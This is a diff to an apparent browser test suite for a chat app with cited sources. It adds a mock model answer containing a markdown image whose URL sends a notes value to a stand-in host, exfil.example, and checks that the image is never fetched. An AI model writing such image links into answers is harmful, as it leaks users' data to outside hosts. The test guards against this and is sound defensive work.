@@ -957,7 +957,7 @@ async function setupPage({
         : refusal
           ? 'No sources were selected for this question.'
           : sameName
-            ? 'The cited upload is the chemistry notes.'
+            ? 'The cited upload is the chemistry notes.\n\n![chart of the notes](https://exfil.example/c.png?notes=chemistry)'
             : 'A basis spans the vector space.';
       record.turns.push({
         sequence: ++record.lastSequence,
@@ -2339,11 +2339,19 @@ test('desktop, phone, and tablet viewports keep long chat lists separate from re
   }
 });
 
-test('a citation opens the cited passage when two sources share a display name', async () => {
+test('a citation opens the cited passage when two sources share a display name, and answer images never load', async () => {
   const { context, page } = await setupPage({ sameNameCitation: true });
+  const offsite = [];
+  page.on('request', (request) => {
+    if (new URL(request.url()).hostname === 'exfil.example') offsite.push(request.url());
+  });
   try {
     await send(page, 'Compare the shared notes');
     await page.getByText('The cited upload is the chemistry notes.', { exact: true }).waitFor();
+    // A model-written image is shown as its alt text and never fetched.
+    await page.getByText('chart of the notes', { exact: true }).waitFor();
+    assert.equal(await page.locator('.prose img').count(), 0);
+    assert.deepEqual(offsite, []);
     await page.getByRole('button', { name: 'Shared Notes page 2' }).click();
     assert.equal(
       await page.getByRole('figure', { name: 'Cited passage' }).locator('blockquote').innerText(),
